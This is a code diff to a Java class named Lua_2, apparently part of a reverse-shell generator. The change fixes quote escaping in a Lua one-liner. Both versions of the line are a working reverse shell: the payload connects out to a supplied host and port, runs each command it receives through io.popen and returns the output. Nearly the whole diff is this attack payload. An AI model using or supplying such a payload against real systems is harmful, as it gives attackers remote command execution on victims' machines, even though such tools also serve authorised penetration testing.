@@ -8,7 +8,7 @@ public class Lua_2 extends Reverse {
 
     public Lua_2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("lua5.1 -e 'local host, port = \\\"%s\\\", %s local socket = require(\\\"socket\\\") local tcp = socket.tcp() local io = require(\\\"io\\\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \\\"r\\\") local s = f:read(\\\"*a\\\") f:close() tcp:send(s) if status == \\\"closed\\\" then break end end tcp:close()'", this.getLocalIP(), this.getLocalPort());
+        shellFormat = String.format("lua5.1 -e 'local host, port = \"%s\", %s local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'", this.getLocalIP(), this.getLocalPort());
     }
 
     @Override
